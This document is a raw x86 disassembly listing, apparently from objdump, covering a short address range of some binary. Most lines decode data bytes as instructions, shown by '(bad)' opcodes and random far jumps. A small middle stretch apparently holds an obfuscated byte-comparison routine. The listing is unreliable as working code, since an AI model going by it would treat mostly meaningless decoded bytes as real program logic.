  4117ec:	sbb    ah,dh
  4117ee:	(bad)  
  4117ef:	fmul   st,st(7)
  4117f1:	mov    eax,ds:0x48a165c5
  4117f6:	sti    
  4117f7:	mov    es,esp
  4117f9:	mov    ah,BYTE PTR [eax+0x6b]
  4117fc:	ret    0xf5
  4117ff:	out    0xb7,eax
  411801:	loopne 0x4117a5
  411803:	cmp    ch,BYTE PTR [edx]
  411805:	xchg   edi,eax
  411806:	out    dx,eax
  411807:	sub    BYTE PTR [eax],ah
  411809:	lea    esp,[ecx-0x7d]
  41180c:	push   ebx
  41180d:	sub    esp,eax
  41180f:	adc    al,0x56
  411811:	add    eax,0x58af9824
  411816:	add    bh,dl
  411818:	jle    0x4117d6
  41181a:	nop
  41181b:	mov    ebx,0xb673e9df
  411820:	mov    WORD PTR [esp+esi*1-0x484b75ec],cs
  411827:	or     al,0xb6
  411829:	sbb    al,0xf9
  41182b:	test   ebx,ebp
  41182d:	ret    
  41182e:	mov    edi,0x6858e897
  411833:	adc    BYTE PTR [ebx-0x50],0x2e
  411837:	xchg   ebp,ebx
  411839:	test   eax,0x5d320352
  41183e:	scas   eax,DWORD PTR es:[edi]
  41183f:	push   eax
  411840:	mov    DWORD PTR [edx-0x17],esp
  411843:	push   0x11178290
  411848:	iret   
  411849:	pop    edi
  41184a:	imul   ecx,DWORD PTR [edx-0x1183cfec],0xb88cdf4
  411854:	and    DWORD PTR [ecx],ebx
  411856:	shl    DWORD PTR [edi+0x26],cl
  411859:	push   0xffffffa2
  41185b:	jb     0x411847
  41185d:	pop    es
  41185e:	outs   dx,DWORD PTR ds:[esi]
  41185f:	outs   dx,BYTE PTR ds:[esi]
  411860:	sar    edx,cl
  411862:	int    0x3b
  411864:	cmp    eax,0x9e285259
  411869:	sbb    ah,BYTE PTR [esi+ebp*8-0x3c]
  41186d:	retf   
  41186e:	pop    eax
  41186f:	fpatan 
  411871:	add    cl,ch
  411873:	dec    ebp
  411874:	outs   dx,BYTE PTR ds:[esi]
  411875:	xor    edx,DWORD PTR [edx-0x5a782dad]
  41187b:	into   
  41187c:	jl     0x4118b9
  41187e:	ins    DWORD PTR es:[edi],dx
  41187f:	into   
  411880:	xlat   BYTE PTR ds:[ebx]
  411881:	out    dx,al
  411882:	mov    DWORD PTR [ebx-0x42],esp
  411885:	jno    0x4118b6
  411887:	or     DWORD PTR ds:0x3617aeda,0x34
  41188e:	mov    ah,0xea
  411890:	cs adc eax,0x23663dea
  411896:	div    BYTE PTR [ebx+0x316dbd27]
  41189c:	iret   
  41189d:	cld    
  41189e:	mov    ebx,0xac8912b9
  4118a3:	mov    bh,0x13
  4118a5:	xchg   esp,edi
  4118a7:	mov    ebx,ebx
  4118a9:	jne    0x41191f
  4118ab:	pop    edi
  4118ac:	les    ebx,FWORD PTR [esi-0x1]
  4118af:	pusha  
  4118b0:	jge    0x4118d6
  4118b2:	xchg   ebx,eax
  4118b3:	fst    QWORD PTR [eax-0x63]
  4118b6:	out    0xec,eax
  4118b8:	xlat   BYTE PTR ds:[ebx]
  4118b9:	add    ecx,DWORD PTR ds:0x835971f2
  4118bf:	cmp    eax,esp
  4118c1:	mov    ds:0x24ee9f67,eax
  4118c6:	jecxz  0x41186a
  4118c8:	fdiv   QWORD PTR ds:0x2a4380e3
  4118ce:	cli    
  4118cf:	add    ecx,esi
  4118d1:	xor    DWORD PTR [esp+ebx*4],eax
  4118d4:	ja     0x41192b
  4118d6:	lahf   
  4118d7:	outs   dx,BYTE PTR ds:[esi]
  4118d8:	inc    edi
  4118d9:	shr    BYTE PTR ds:0xd1437199,1
  4118df:	pop    ebp
  4118e0:	ret    0x143
  4118e3:	stos   DWORD PTR es:[edi],eax
  4118e4:	in     al,dx
  4118e5:	xchg   edi,eax
  4118e6:	outs   dx,BYTE PTR ds:[esi]
  4118e7:	xor    dh,BYTE PTR [esi-0x5b]
  4118ea:	bound  esp,QWORD PTR [edi+edi*1+0x55a9a787]
  4118f1:	lea    esp,[eax-0x2e]
  4118f4:	push   ebx
  4118f5:	int    0x5e
  4118f7:	not    dl
  4118f9:	dec    eax
  4118fa:	inc    esp
  4118fb:	push   0x4
  4118fd:	pop    esi
  4118fe:	push   eax
  4118ff:	jg     0x41188a
  411901:	push   esi
  411902:	jle    0x411981
  411904:	fs pop eax
  411906:	jl     0x41191a
  411908:	in     eax,0x3a
  41190a:	and    BYTE PTR [esi-0x6bce2605],al
  411910:	daa    
  411911:	jo     0x411959
  411913:	mov    gs,WORD PTR [edx]
  411915:	pop    ss
  411916:	mov    ebx,es
  411918:	call   0xcd47:0xd394c68c
  41191f:	pop    edx
  411920:	sub    edi,DWORD PTR ds:0x8bb92a47
  411926:	test   DWORD PTR [edi-0x3],eax
  411929:	add    BYTE PTR [edx+0x46],0xc6
  41192d:	stos   BYTE PTR es:[edi],al
  41192e:	(bad)  
  41192f:	fild   DWORD PTR [ebx+0x593c3a83]
  411935:	and    DWORD PTR [ebp+edi*1+0x52],esi
  411939:	dec    ebp
  41193a:	xchg   edx,eax
  41193b:	or     al,0x77
  41193d:	cmp    al,0x1e
  41193f:	mov    BYTE PTR [eax+0x74849d82],dh
  411945:	or     ebx,DWORD PTR [ecx+0x4ef354e6]
  41194b:	sub    esi,edx
  41194d:	ds adc bh,dl
  411950:	inc    BYTE PTR [edx+0x58]
  411953:	sti    
  411954:	aam    0xb1
  411956:	repnz arpl WORD PTR [esi-0x5a],si
  41195a:	ds addr16 hlt 
  41195d:	scas   eax,DWORD PTR es:[edi]
  41195e:	in     eax,0x84
  411960:	pop    ebx
  411961:	jmp    0xad7f:0xa275e5a7
  411968:	(bad)  
  411969:	push   ss
  41196a:	xor    DWORD PTR [edx-0x10f3b81c],edx
  411970:	push   es
  411971:	lahf   
  411972:	inc    ebx
  411973:	push   ss
  411974:	and    al,0x21
  411976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411977:	sti    
  411978:	sbb    bh,BYTE PTR [ebx]
  41197a:	jne    0x4119f2
  41197c:	test   DWORD PTR [ebp+0xa],esp
  41197f:	loop   0x411976
  411981:	jo     0x4119e7
  411983:	inc    esi
  411984:	inc    edx
  411985:	adc    eax,DWORD PTR [eax+0x17e8f863]
  41198b:	in     eax,dx
  41198c:	mov    BYTE PTR [bx+0x58],0xe4
  411991:	mov    ds:0x21112c5e,eax
  411996:	je     0x411924
  411998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411999:	sub    ecx,ecx
  41199b:	int    0x41
  41199d:	push   eax
  41199e:	push   edi
  41199f:	sbb    ch,BYTE PTR [ecx-0x66]
  4119a2:	jmp    0x257a9fba
  4119a7:	and    cl,al
  4119a9:	add    edx,eax
  4119ab:	pushf  
  4119ac:	xor    BYTE PTR [edi],bh
  4119ae:	add    cl,BYTE PTR [edx+0x63527e80]
  4119b4:	cmp    al,0xfe
  4119b6:	ror    BYTE PTR [edx-0x76641043],cl
  4119bc:	mov    edi,0x3132483b
  4119c1:	cmp    eax,0x7df33b59
  4119c6:	fs ins DWORD PTR es:[edi],dx
  4119c8:	std    
  4119c9:	mov    bh,0x56
  4119cb:	sub    esp,edx
  4119cd:	push   esi
  4119ce:	lahf   
  4119cf:	sub    BYTE PTR [eax+0x2f],bl
  4119d2:	div    BYTE PTR [edi-0x5b]
  4119d5:	push   edx
  4119d6:	or     edx,DWORD PTR [ebp-0x327b4ba8]
  4119dc:	inc    ecx
  4119dd:	mov    ds:0xfa5ff77b,eax
  4119e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119e3:	xor    cl,BYTE PTR [ebx]
  4119e5:	scas   eax,DWORD PTR es:[edi]
  4119e6:	(bad)  [eax+0x1ba61216]
  4119ec:	popf   
  4119ed:	rol    DWORD PTR [ecx+0x20],1
  4119f0:	xor    eax,0x286d0ac5
  4119f5:	call   0x5705ba70
  4119fa:	xchg   ebp,eax
  4119fb:	retf   
  4119fc:	ret    
  4119fd:	inc    esi
  4119fe:	inc    edi
  4119ff:	in     al,0x44
  411a01:	pushf  
  411a02:	popa   
  411a03:	iret   
  411a04:	mov    al,ds:0xe6168dc6
  411a09:	mov    edx,DWORD PTR [ebp+0x8]
  411a0c:	mov    ebx,DWORD PTR [ebp-0x58]
  411a0f:	add    edx,0x5708f8
  411a15:	imul   edx,ebx
  411a18:	mov    DWORD PTR [ebp-0x58],edx
  411a1b:	mov    edx,DWORD PTR [ebp+0x8]
  411a1e:	mov    ebx,DWORD PTR [ebp-0x54]
  411a21:	add    edx,0x64f8da
  411a27:	or     edx,ebx
  411a29:	mov    DWORD PTR [ebp-0x54],edx
  411a2c:	mov    edx,DWORD PTR [ebp+0x8]
  411a2f:	mov    ebx,DWORD PTR [ebp-0x50]
  411a32:	add    edx,ecx
  411a34:	xor    edx,ebx
  411a36:	mov    DWORD PTR [ebp-0x50],edx
  411a39:	mov    edx,DWORD PTR [ebp+0x8]
  411a3c:	mov    ebx,DWORD PTR [ebp-0x4c]
  411a3f:	add    edx,edi
  411a41:	and    edx,ebx
  411a43:	mov    DWORD PTR [ebp-0x4c],edx
  411a46:	mov    edx,DWORD PTR [ebp+0x8]
  411a49:	mov    ebx,DWORD PTR [ebp-0x48]
  411a4c:	lea    edx,[ebx+edx*1+0x241fc1f]
  411a53:	mov    DWORD PTR [ebp-0x48],edx
  411a56:	mov    edx,DWORD PTR [ebp+0x8]
  411a59:	mov    ebx,0xfa5e15e2
  411a5e:	sub    ebx,edx
  411a60:	add    ebx,DWORD PTR [ebp-0x44]
  411a63:	mov    DWORD PTR [ebp-0x44],ebx
  411a66:	mov    edx,DWORD PTR [ebp+0x8]
  411a69:	xor    edx,eax
  411a6b:	add    edx,esi
  411a6d:	jne    0x40f670
  411a73:	mov    edx,DWORD PTR [ebp-0xc]
  411a76:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  411a7d:	mov    bl,BYTE PTR [ebp-0x1]
  411a80:	cmp    dl,bl
  411a82:	je     0x413ee6
  411a88:	mov    ecx,DWORD PTR [ebp-0x5c]
  411a8b:	mov    edx,DWORD PTR [ebp-0xc]
  411a8e:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  411a95:	mov    ebx,DWORD PTR [ebp+0xc]
  411a98:	xor    ecx,eax
  411a9a:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e0]
  411aa1:	jne    0x418726
  411aa7:	mov    ecx,DWORD PTR [ebp-0x5c]
  411aaa:	mov    edx,DWORD PTR [ebp+0xc]
  411aad:	xor    ecx,eax
  411aaf:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e0]
  411ab7:	mov    edx,DWORD PTR [ebp-0x18]
  411aba:	xor    edx,eax
  411abc:	add    edx,esi
  411abe:	cmp    ecx,edx
  411ac0:	mov    ecx,DWORD PTR [ebp-0x14]
  411ac3:	mov    DWORD PTR [ebp+0x8],ecx
  411ac6:	mov    ecx,DWORD PTR [ebp+0x8]
  411ac9:	je     0x41abb4
  411acf:	xor    ecx,eax
  411ad1:	add    ecx,esi
  411ad3:	mov    ecx,0x242ebed
  411ad8:	je     0x4162f4
  411ade:	mov    edx,DWORD PTR [ebp+0x8]
  411ae1:	mov    ebx,DWORD PTR [ebp-0x8]
  411ae4:	xor    edx,eax
  411ae6:	xor    ebx,eax
  411ae8:	sub    edx,ebx
  411aea:	sub    edx,esi
  411aec:	xor    edx,eax
  411aee:	mov    DWORD PTR [ebp+0x8],edx
  411af1:	mov    edx,DWORD PTR [ebp+0x8]
  411af4:	mov    ebx,DWORD PTR [ebp-0x58]
  411af7:	add    edx,0x5708f8
  411afd:	imul   edx,ebx
  411b00:	mov    DWORD PTR [ebp-0x58],edx
  411b03:	mov    edx,DWORD PTR [ebp+0x8]
  411b06:	mov    ebx,DWORD PTR [ebp-0x54]
  411b09:	add    edx,0x64f8da
  411b0f:	or     edx,ebx
  411b11:	mov    DWORD PTR [ebp-0x54],edx
  411b14:	mov    edx,DWORD PTR [ebp+0x8]
  411b17:	mov    ebx,DWORD PTR [ebp-0x50]
  411b1a:	add    edx,ecx
  411b1c:	xor    edx,ebx
  411b1e:	mov    DWORD PTR [ebp-0x50],edx
  411b21:	mov    edx,DWORD PTR [ebp+0x8]
  411b24:	mov    ebx,DWORD PTR [ebp-0x4c]
  411b27:	add    edx,edi
  411b29:	and    edx,ebx
  411b2b:	mov    DWORD PTR [ebp-0x4c],edx
  411b2e:	mov    edx,DWORD PTR [ebp+0x8]
  411b31:	mov    ebx,DWORD PTR [ebp-0x48]
  411b34:	lea    edx,[ebx+edx*1+0x241fc1f]
  411b3b:	mov    DWORD PTR [ebp-0x48],edx
  411b3e:	mov    edx,DWORD PTR [ebp+0x8]
  411b41:	mov    ebx,0xfa5e15e2
  411b46:	sub    ebx,edx
  411b48:	add    ebx,DWORD PTR [ebp-0x44]
  411b4b:	mov    DWORD PTR [ebp-0x44],ebx
  411b4e:	mov    edx,DWORD PTR [ebp+0x8]
  411b51:	xor    edx,eax
  411b53:	add    edx,esi
  411b55:	jne    0x411ade
  411b5b:	jmp    0x4162f4
  411b60:	jmp    0x413ee6
  411b65:	out    0x82,al
  411b67:	push   es
  411b68:	and    eax,0x81c5a506
  411b6d:	outs   dx,BYTE PTR ds:[esi]
  411b6e:	fs sub eax,0x24dc43ed
  411b74:	xor    eax,0x7a7aae2e
  411b79:	add    DWORD PTR [edi+0x7a],ebx
  411b7c:	jp     0x411ba7
  411b7e:	and    BYTE PTR [edi+0x38],ch
  411b81:	nop
  411b82:	fstp   DWORD PTR [ecx-0x5de46c60]
  411b88:	jmp    0x411b82
  411b8a:	(bad)  
  411b8b:	in     eax,0xf9
  411b8d:	inc    ebp
  411b8e:	test   BYTE PTR [ecx+0x30],ch
  411b91:	loope  0x411bfa
  411b93:	dec    BYTE PTR [ebx]
  411b95:	lods   al,BYTE PTR ds:[esi]
  411b96:	adc    esi,DWORD PTR [eax+0x2a]
  411b99:	mov    bh,0x3c
  411b9b:	jle    0x411b50
  411b9d:	bound  ecx,QWORD PTR [esi+0x4f02df1a]
  411ba3:	les    edx,FWORD PTR [ebx-0x1aa782fe]
  411ba9:	lods   al,BYTE PTR ds:[esi]
  411baa:	not    BYTE PTR [esi]
  411bac:	pop    esp
  411bad:	inc    eax
  411bae:	push   ebx
  411baf:	das    
  411bb0:	ror    BYTE PTR [ebx],1
  411bb2:	mov    ebx,0xbf8d0487
  411bb7:	(bad)  
  411bb8:	jae    0x411c2f
  411bba:	cld    
  411bbb:	into   
  411bbc:	mov    eax,ds:0x26723a7f
  411bc1:	cmp    dh,BYTE PTR [ebp+0x2]
  411bc4:	dec    edx
  411bc5:	jbe    0x411bda
  411bc7:	repz in al,0xab
  411bca:	(bad)  
  411bcb:	out    0xff,al
  411bcd:	arpl   WORD PTR [eax+0x279fedb9],di
  411bd3:	sahf   
  411bd4:	add    al,BYTE PTR ds:0x3dd1
  411bd9:	inc    eax
  411bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bdb:	xchg   ebp,eax
  411bdc:	jo     0x411b60
  411bde:	les    eax,FWORD PTR [ebp+0x7f4a314a]
  411be4:	leave  
  411be5:	test   eax,0x4967f515
  411bea:	mov    ah,BYTE PTR [ebp+0x3d52c0ec]
  411bf0:	mov    dl,0xcd
  411bf2:	dec    edx
  411bf3:	add    BYTE PTR [esi+eiz*8],ah
  411bf6:	inc    ecx
  411bf7:	jecxz  0x411bcc
  411bf9:	adc    eax,0xd88c3835
  411bfe:	shr    DWORD PTR [esi],cl
  411c00:	pop    esi
  411c01:	xchg   si,ax
  411c03:	xor    BYTE PTR [edi+0x28],0xe6
  411c07:	out    0xc3,eax
  411c09:	cmc    
  411c0a:	in     al,dx
  411c0b:	mov    edi,0x8230ae57
  411c10:	stc    
  411c11:	or     DWORD PTR [ebx],eax
  411c13:	mov    ds:0xe4fdeb19,eax
  411c18:	add    edi,DWORD PTR fs:[ecx+0x5d]
  411c1c:	repz adc eax,0x8c32beb2
  411c22:	cmc    
  411c23:	sbb    bl,BYTE PTR [edi]
  411c25:	pop    ebp
  411c26:	jecxz  0x411c94
  411c28:	ins    DWORD PTR es:[edi],dx
  411c29:	out    dx,eax
  411c2a:	sub    bh,0x9a
  411c2d:	dec    eax
  411c2e:	(bad)  
  411c30:	adc    al,0x32
  411c32:	inc    esp
  411c33:	nop
  411c34:	sbb    ch,BYTE PTR [edx-0x131b9504]
  411c3a:	(bad)  
  411c3c:	xor    DWORD PTR [edx+eax*2+0x6dc6841e],0xffffff89
  411c44:	aas    
  411c45:	jb     0x411c87
  411c47:	add    DWORD PTR [ecx+ebp*8-0x3e74057a],ebx
  411c4e:	push   ss
  411c4f:	mov    esi,DWORD PTR [ebp+ebp*8+0x40]
  411c53:	or     bh,BYTE PTR [edx]
  411c55:	pop    ebx
  411c56:	in     al,0xaa
  411c58:	not    DWORD PTR [ecx-0x7e]
  411c5b:	fst    QWORD PTR [ebx]
  411c5d:	mov    ah,0xac
  411c5f:	hlt    
  411c60:	iret   
  411c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c62:	push   edi
  411c63:	lfs    edx,FWORD PTR ds:0x54a9ded1
  411c6a:	pop    ebp
  411c6b:	mov    esi,0x60da8aaa
  411c70:	fild   WORD PTR [edx]
  411c72:	mov    eax,ds:0xfb227677
  411c77:	xchg   cl,dh
  411c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c7a:	mov    cl,0xf5
  411c7c:	and    eax,0x5048f788
  411c81:	xchg   ch,dh
  411c83:	push   esi
  411c84:	xchg   ebx,eax
  411c85:	loopne 0x411cab
  411c87:	pop    esp
  411c88:	mov    dh,ch
  411c8a:	xchg   esi,eax
  411c8b:	mov    eax,ds:0xe9dcb886
  411c90:	mov    ah,0xd7
  411c92:	stos   WORD PTR es:[edi],ax
  411c94:	imul   esp,DWORD PTR [ebx+0x274f1033],0x4c
  411c9b:	aad    0x51
  411c9d:	xor    eax,0x7a10d309
  411ca2:	pushf  
  411ca3:	add    BYTE PTR [edx],0xd2
  411ca6:	adc    BYTE PTR [edi+0x57],0x21
  411caa:	xlat   BYTE PTR ds:[ebx]
  411cab:	xchg   DWORD PTR cs:[ecx-0x6],eax
  411caf:	pop    es
  411cb0:	add    BYTE PTR [edi-0xb3bfffb],ah
  411cb6:	je     0x411d03
  411cb8:	pop    ss
  411cb9:	adc    dl,BYTE PTR [esi+esi*4+0x22d1ad6c]
  411cc0:	xor    dh,BYTE PTR [edi-0x5b093f26]
  411cc6:	cmp    al,0x25
  411cc8:	outs   dx,DWORD PTR ds:[esi]
  411cc9:	mov    ebp,0x39c34b3b
  411cce:	ret    0x35c8
  411cd1:	jge    0x411c71
  411cd3:	rcr    ch,0x32
  411cd6:	mov    edx,0x83cfdb70
  411cdb:	call   0x94b5ee2f
  411ce0:	mov    dl,0xa1
  411ce2:	push   ecx
  411ce3:	cmp    DWORD PTR es:[ebp+ebx*1-0x12],eax
  411ce8:	push   edi
  411ce9:	dec    ebx
  411cea:	xchg   DWORD PTR [edi+0x5a],esp
  411ced:	sahf   
  411cee:	and    DWORD PTR [edi],ebx
  411cf0:	out    dx,eax
  411cf1:	daa    
  411cf2:	sub    BYTE PTR ds:0x22d020a2,ah
  411cf8:	adc    dl,BYTE PTR [edi+0x4a]
  411cfb:	mov    esp,0x78645cb9
  411d00:	xchg   DWORD PTR ss:[esi+ebp*8+0x4b56634c],ebx
  411d08:	in     al,dx
  411d09:	mov    eax,0xc3766ae3
  411d0e:	dec    ebx
  411d0f:	mov    ebp,0xf3949376
  411d14:	mov    ch,0x4c
  411d16:	add    ch,BYTE PTR [esi-0x4d]
  411d19:	iret   
  411d1a:	jmp    0x411cb3
  411d1c:	je     0x411ccc
  411d1e:	cwde   
  411d1f:	inc    ebx
  411d20:	mov    ecx,0x87806913
  411d25:	fisttp WORD PTR [ebx+0x737a1ba7]
  411d2b:	sbb    cl,bl
  411d2d:	mov    ecx,0x10643a04
  411d32:	dec    ecx
  411d33:	mov    al,ds:0x58478430
  411d38:	test   al,0xd6
  411d3a:	retf   
  411d3b:	inc    ebx
  411d3c:	aaa    
  411d3d:	pop    edi
  411d3e:	pop    esi
  411d3f:	push   0xffffffab
  411d41:	fstp   TBYTE PTR [esp+ebp*4]
  411d44:	int    0x9a
  411d46:	sub    bh,BYTE PTR [eax-0xfeb7b57]
  411d4c:	cvtps2pi mm6,QWORD PTR [edx-0x6809c289]
  411d53:	jle    0x411d13
  411d55:	ror    bl,0xf8
  411d58:	aam    0xfc
  411d5a:	hlt    
  411d5b:	push   eax
  411d5c:	inc    edx
  411d5d:	stos   DWORD PTR es:[edi],eax
  411d5e:	mov    cl,0x43
  411d60:	sub    eax,0x4390ff8c
  411d65:	fdivr  st,st(1)
  411d67:	xor    dl,dh
  411d69:	ret    0xaf06
  411d6c:	jmp    0x172e9c68
  411d71:	push   edi
  411d72:	mov    eax,ds:0x32036acc
  411d77:	ja     0x411dd1
  411d79:	cmp    edi,DWORD PTR [eax+0x4]
  411d7c:	lock mov edi,gs
  411d7f:	mov    dh,0xb
  411d81:	mov    edi,0xc7c7bc43
  411d86:	cmp    DWORD PTR [edx-0x5603cebb],ebp
  411d8c:	lds    ebp,FWORD PTR [edi+0xb484a70]
  411d92:	fcomip st,st(0)
  411d94:	fdivr  DWORD PTR ds:0xfd6f48f
  411d9a:	in     eax,0x77
  411d9c:	sub    al,BYTE PTR [edi-0x21]
  411d9f:	jno    0x411d5d
  411da1:	pop    es
  411da2:	mov    esp,0xa8fe03e4
  411da7:	call   0x9465eed0
  411dac:	retf   0x4ec
  411daf:	or     bh,BYTE PTR [ebx]
  411db1:	iret   
  411db2:	jmp    0x411d51
  411db4:	pop    esi
  411db5:	add    BYTE PTR [edx+0x7e],cl
  411db8:	push   0x65267c58
  411dbd:	push   0xe6adb559
  411dc2:	add    DWORD PTR [esi+0x1c15a5b],0x30b17dd8
  411dcc:	pop    ds
  411dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dce:	fs and al,0x9c
  411dd1:	jge    0x411da2
  411dd3:	shr    DWORD PTR [ecx],cl
  411dd5:	jp     0x411d8a
  411dd7:	sbb    al,0xd2
  411dd9:	push   ds
  411dda:	xchg   edi,eax
  411ddb:	ins    DWORD PTR es:[edi],dx
  411ddc:	popa   
  411ddd:	jl     0x411daf
  411ddf:	mov    esi,0xf70cf8dc
  411de4:	jae    0x411dae
  411de6:	add    DWORD PTR [ecx],ebx
  411de8:	(bad)  
  411de9:	jmp    0xdabd:0xfc8ff748
  411df0:	sub    DWORD PTR [ecx],0x44a0fb15
  411df6:	imul   ebp,DWORD PTR [esi-0x67adf360],0xffffff9e
  411dfd:	test   BYTE PTR [esi-0x5a],bh
  411e00:	or     edx,DWORD PTR [ebp-0x6f]
  411e03:	pop    ebx
  411e04:	pop    ss
  411e05:	pop    edi
  411e06:	mov    edi,0x8b4a56f6
  411e0b:	bound  edi,QWORD PTR [eax]
  411e0d:	dec    edx
  411e0e:	aad    0xd3
  411e10:	push   eax
  411e11:	mov    al,BYTE PTR [ebp-0x1c]
  411e14:	gs leave 
  411e16:	cld    
  411e17:	leave  
  411e18:	xchg   ebp,eax
  411e19:	xchg   ecx,eax
  411e1a:	lock rcr BYTE PTR [eax-0x41],1
  411e1e:	add    edi,esp
  411e20:	cmc    
  411e21:	xor    esp,edi
  411e23:	repnz scas al,BYTE PTR es:[edi]
  411e25:	dec    eax
  411e26:	or     eax,0xadd8090
  411e2b:	mov    bl,0x2a
  411e2d:	or     eax,edi
  411e2f:	pushf  
  411e30:	or     BYTE PTR [ecx],dh
  411e32:	adc    BYTE PTR [edx],0x9c
  411e35:	pop    ebp
  411e36:	aaa    
  411e37:	stos   BYTE PTR es:[edi],al
  411e38:	and    BYTE PTR [esi+ebx*1+0x64],dl
  411e3c:	dec    esi
  411e3d:	adc    al,BYTE PTR [ecx+0x4a6d2c52]
  411e43:	jp     0x411dfc
  411e45:	push   esp
  411e46:	leave  
  411e47:	enter  0x3297,0x2a
  411e4b:	call   0xa593:0xf1d88083
  411e52:	cdq    
  411e53:	xchg   ebp,eax
  411e54:	push   ebx
  411e55:	sbb    DWORD PTR [ebx],edi
  411e57:	or     DWORD PTR [edx-0x7c],esp
  411e5a:	xor    al,0x38
  411e5c:	dec    esi
  411e5d:	loop   0x411edd
  411e5f:	(bad)  
  411e60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e61:	imul   esi,ebp,0xffffffa6
  411e64:	xchg   BYTE PTR [edx],dl
  411e66:	xor    BYTE PTR [eax],ah
  411e68:	jns    0x411e4b
  411e6a:	mov    esp,0x62c3d76c
  411e6f:	cs loopne 0x411ed4
  411e72:	lea    eax,[esi]
  411e74:	iret   
  411e75:	cmp    DWORD PTR [edi+0x4e],ebp
  411e78:	mov    dl,0x18
  411e7a:	add    al,0x37
  411e7c:	mov    eax,ds:0xd2ed793e
  411e81:	inc    esp
  411e82:	out    0x3d,eax
  411e84:	push   edx
  411e85:	mov    bh,0x2
  411e87:	mov    ah,0xe2
  411e89:	loopne 0x411ebf
  411e8b:	push   edx
  411e8c:	inc    ecx
  411e8d:	loop   0x411ee8
  411e8f:	mov    edx,0xf3cc47d7
  411e94:	ins    BYTE PTR es:[edi],dx
  411e95:	outs   dx,DWORD PTR ds:[esi]
  411e96:	scas   al,BYTE PTR es:[edi]
  411e97:	jmp    DWORD PTR [edi-0x5e]
  411e9a:	add    eax,DWORD PTR [esp+edx*4]
  411e9d:	pop    ebp
  411e9e:	xchg   edx,eax
  411e9f:	sub    edi,ecx
  411ea1:	inc    edx
  411ea2:	mov    ecx,0x690bc83c
  411ea7:	mov    ah,0x36
  411ea9:	cdq    
  411eaa:	mov    esp,0xf2b4850a
  411eaf:	jge    0x411e81
  411eb1:	push   ds
  411eb2:	fs push ecx
  411eb4:	(bad)  
  411eb5:	loope  0x411f1a
  411eb7:	lods   eax,DWORD PTR ds:[esi]
  411eb8:	adc    al,0xc5
  411eba:	pop    di
  411ebc:	sahf   
  411ebd:	inc    eax
  411ebe:	cmove  ebp,DWORD PTR ds:0xa1384e84
  411ec5:	mov    bl,0xd0
  411ec7:	jae    0x411f47
  411ec9:	les    edi,FWORD PTR [edi+0x7a5754d9]
  411ecf:	sub    al,0xf7
  411ed1:	pop    ss
  411ed2:	mov    ds:0xfc94efa4,al
  411ed7:	sub    eax,0x3d229f33
  411edc:	in     al,dx
  411edd:	daa    
  411ede:	xor    al,ch
  411ee0:	mov    cl,0x36
  411ee2:	cwde   
  411ee3:	jne    0x411f44
  411ee5:	lds    edx,FWORD PTR [ebx+0x4f65bf]
  411eeb:	sbb    eax,0xc83aead
  411ef0:	xor    BYTE PTR [ecx+ebx*4-0x3b4b60bf],ah
  411ef7:	(bad)  
  411ef8:	(bad)
  411efb:	mov    al,0x5a
  411efd:	jbe    0x411f73
  411eff:	add    bl,0x47
  411f02:	jb     0x411f66
  411f04:	adc    DWORD PTR [ebx-0x674a0c15],edi
  411f0a:	and    ebp,DWORD PTR [esi]
  411f0c:	inc    esi
  411f0d:	jne    0x411f07
  411f0f:	cli    
  411f10:	fst    DWORD PTR [edx]
  411f12:	repnz (bad) 
  411f14:	outs   dx,BYTE PTR ds:[esi]
  411f15:	dec    ebx
  411f16:	xlat   BYTE PTR ds:[ebx]
  411f17:	adc    dl,BYTE PTR [ebx+0x53f7608d]
  411f1d:	aas    
  411f1e:	ds sti 
  411f20:	retf   0xf4b0
  411f23:	sbb    cl,dl
  411f25:	push   ds
  411f26:	mov    dl,0xc7
  411f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f29:	leave  
  411f2a:	xchg   edi,edi
  411f2c:	das    
  411f2d:	cs inc eax
  411f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f30:	(bad)  
  411f31:	(bad)  
  411f33:	inc    eax
  411f34:	jle    0x411fa6
  411f36:	push   0x38097844
  411f3b:	mov    cs,WORD PTR fs:[edi-0x42620947]
  411f42:	xchg   edx,eax
  411f43:	jg     0x411f6c
  411f45:	sub    eax,ebp
  411f47:	xchg   edi,eax
  411f48:	mov    bh,0xae
  411f4a:	mov    ah,0xf7
  411f4c:	push   ss
  411f4d:	test   BYTE PTR ss:[ebx+0x71],0x51
  411f52:	jmp    0x411f4d
  411f54:	inc    esi
  411f55:	es push 0x29deed2e
  411f5b:	or     BYTE PTR fs:[edi+esi*8+0x67bf545a],bh
  411f63:	pop    edx
  411f64:	pop    eax
  411f65:	or     ebp,DWORD PTR [eax]
  411f67:	das    
  411f68:	xchg   esi,eax
  411f69:	(bad)  
  411f6a:	ds das 
  411f6c:	les    edi,FWORD PTR [esi+0x2d]
  411f6f:	pop    esp
  411f70:	and    ebx,DWORD PTR [edx+0x8]
  411f73:	sbb    al,BYTE PTR [edi+0x47]
  411f76:	mov    edx,0xccc18312
  411f7b:	(bad)  
  411f7c:	jae    0x411ff9
  411f7e:	inc    esi
  411f7f:	lods   al,BYTE PTR ds:[esi]
  411f80:	fisub  DWORD PTR [eax+0x6]
  411f83:	(bad)
  411f86:	dec    edi
  411f87:	icebp  
  411f88:	pop    edx
  411f89:	sbb    BYTE PTR [ebp-0x496d0482],cl
  411f8f:	jmp    0x871c:0x59ebe1a6
  411f96:	push   ecx
  411f97:	pop    ss
  411f98:	mov    edx,0x780e059f
  411f9d:	lds    esi,FWORD PTR [esi-0x27272665]
  411fa3:	dec    edi
  411fa4:	in     al,0x26
  411fa6:	gs jge 0x411fff
  411fa9:	sub    ebx,DWORD PTR [eax]
  411fab:	std    
  411fac:	in     eax,0x4a
  411fae:	dec    esi
  411faf:	mov    es:0xd64c1067,al
  411fb5:	call   0xfb3:0x4e466369
